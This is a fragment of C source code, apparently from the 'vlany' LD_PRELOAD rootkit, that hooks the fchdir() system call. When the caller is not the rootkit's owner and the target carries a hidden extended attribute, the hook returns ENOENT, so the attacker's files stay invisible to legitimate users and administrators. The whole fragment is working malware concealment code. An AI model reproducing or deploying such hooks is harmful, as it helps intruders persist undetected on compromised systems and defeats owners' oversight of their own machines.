int fchdir(int fd)
{
    #ifdef DEBUG
        printf("[vlany] fchdir() called\n");
    #endif

    HOOK(old_fchdir, CFCHDIR);

    if(owned()) return old_fchdir(fd);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_fchdir(fd);
}
